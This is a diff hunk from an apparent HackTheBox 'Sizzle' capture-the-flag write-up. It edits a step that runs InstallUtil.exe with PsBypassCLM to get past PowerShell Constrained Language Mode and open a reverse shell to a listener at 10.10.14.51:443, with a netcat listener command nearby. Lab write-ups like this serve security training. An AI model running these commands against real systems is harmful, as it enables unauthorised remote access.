@@ -450,7 +450,7 @@ rlwrap nc -lnvp 443
 Next, I execute `PsBypassCLM.exe` with the `revshell` option to connect back to my listener:
 
 ```cmd
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.51 /rport=443 c:\\users\amanda\appdata\local\temp\bypassCLM.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.51 /rport=443 c:\\Windows\Temp\bypassCLM.exe
 ```
 
 ![execute-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/execute-34.png)
